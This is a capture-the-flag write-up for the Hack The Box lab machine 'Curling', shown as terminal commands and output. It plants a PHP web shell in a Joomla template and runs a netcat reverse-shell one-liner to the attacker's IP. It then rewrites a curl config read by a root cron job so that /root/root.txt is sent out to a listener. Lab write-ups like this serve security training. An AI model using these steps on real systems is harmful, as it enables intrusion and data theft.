# Curling
Curling is a Linux box, that is rated as easy. This box require a fair amount of enumeration, and learning how to use curl.

# Recon
Start with nmap scan:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Curling]
└─$ nmap -sC -sV 10.10.10.150
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-19 19:21 EDT
Nmap scan report for 10.10.10.150
Host is up (0.030s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.74 seconds
```
So port 80 is running  Joomla, basic google search show how to get its version. So the version can be seen here: http://10.10.10.150/administrator/manifests/files/joomla.xml

Joomla version **3.8.8**

If we use curl on the main page we find something intresting:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Curling]
└─$ curl http://10.10.10.150/
<!DOCTYPE html>
<html lang="en-gb" dir="ltr">
<head>

...

</body>
      <!-- secret.txt -->
</html>
```
Let's try use curl again and get ```secret.txt```:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Curling]
└─$ curl http://10.10.10.150/secret.txt
Q3VybGluZzIwMTgh
```
Now decode it:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Curling]
└─$ echo "Q3VybGluZzIwMTgh" | base64 -d
Curling2018!
```
So it looks like this is a password. I was able to guess the username, because it was located in the main page. Username and Password: ```floris:Curling2018!```. We are now logged in as **Super User**.

We can access the admin panel here: http://10.10.10.150/administrator

# User Flag
So to get a shell go to **Extensions** and then **Templates** after that click on the first one ```Beez3 - Default```. Now click on **New File**, write down the name and for the type use **php**. Then click on create.

Add this line to the file ```<?php system($_GET['cmd']); ?>```. Then click on **Save**. Now the page can be accessed at http://10.10.10.150/templates/beez3/<your_shell_name> . We can now run commands by calling the parameter **cmd**:
```
http://10.10.10.150/templates/beez3/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Now start a listener. and run this command: ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.27 4444 >/tmp/f```

```
┌──(kali㉿kali)-[~/Desktop/HTB/Curling]
└─$ curl http://10.10.10.150/templates/beez3/shell.php -G --data-urlencode 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.27 4444 >/tmp/f'
```

And we got our reverse shell:
```
(pwncat-env) ┌──(kali㉿kali)-[~/Desktop/pwncat]
└─$ pwncat --listen -p 4444                                                                                                               
[19:50:46] received connection from 10.10.10.150:47974
[19:50:46] new host w/ hash a22662bb4b016e036e95fc980b7cce73                                                                                                                         
[19:50:48] pwncat running in /bin/sh
[19:50:50] pwncat is ready 🐈                                                   

(remote) www-data@curling:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Let's download **password_backup**:
```
(local) pwncat$ download password_backup /home/kali/Desktop/HTB/
```

Content of **password_backup**:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Curling]
└─$ cat password_backup                
00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
000000f0: 819b bb48                                ...H
```

So the first 3 bytes of the file are refering to bz2.

```
┌──(kali㉿kali)-[~/Desktop/HTB/Curling]
└─$ cat password_backup | xxd -r > password_backup.bz2
```
Now decompress it:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Curling]
└─$ bunzip2 -k password_backup.bz2
```
check file type:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Curling]
└─$ file password_backup
password_backup: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix, original size modulo 2^32 141
```

unzip it:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Curling]
└─$ mv password_backup password_backup.gz 
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/HTB/Curling]
└─$ gunzip -k password_backup.gz
```

After unziping many files you will ended up with a tar file:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Curling]
└─$ tar xvf password_backup.tar   
password.txt
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/HTB/Curling]
└─$ cat password.txt                                  
5d<wdCbdZu)|hChXll
```

So we can now **su** to user ```floris``` or ssh to it:

## ssh

```
┌──(kali㉿kali)-[~/Desktop/HTB]
└─$ ssh floris@10.10.10.150 
The authenticity of host '10.10.10.150 (10.10.10.150)' can't be established.
ECDSA key fingerprint is SHA256:o1Cqn+GlxiPRiKhany4ZMStLp3t9ePE9GjscsUsEjWM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.150' (ECDSA) to the list of known hosts.
floris@10.10.10.150's password: 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-22-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Sep 20 00:11:20 UTC 2020

  System load:  0.0               Processes:            172
  Usage of /:   46.2% of 9.78GB   Users logged in:      0
  Memory usage: 21%               IP address for ens33: 10.10.10.150
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon May 28 17:00:48 2018 from 192.168.1.71
floris@curling:~$ ls
admin-area  password_backup  user.txt
floris@curling:~$ id
uid=1000(floris) gid=1004(floris) groups=1004(floris)
```
We are in get the user flag:
```
floris@curling:~$ cat user.txt 
65dd1df0...8cf11b8530b
```

# Root Flag

I used **pspy** and found this:

```
| /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report 
| /bin/sh -c sleep 1; cat /root/default.txt > /home/floris/admin-area/input 
| /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report 
```

So we can make it print for us the root flag, we only need to change the ```input``` file:
```
floris@curling:~/admin-area$ cat input 
url = "http://127.0.0.1"
```

Change it to this:

```
floris@curling:~/admin-area$ cat input 

url = "http://10.10.14.27"
data = @/root/root.txt
```
And start a listener on port 80:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Curling]
└─$ sudo nc -nlvp 80                                                                                                                                                                       
listening on [any] 80 ...
```

And you will get the flag:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Curling]
└─$ sudo nc -nlvp 80                                                                                                                                                                       
listening on [any] 80 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.150] 38482
POST / HTTP/1.1
Host: 10.10.14.27
User-Agent: curl/7.58.0
Accept: */*
Content-Length: 32
Content-Type: application/x-www-form-urlencoded

82c198ab...a2ee5c26064a
```

Thank you for reading, and you can find me here on twitter: https://twitter.com/electronicbots
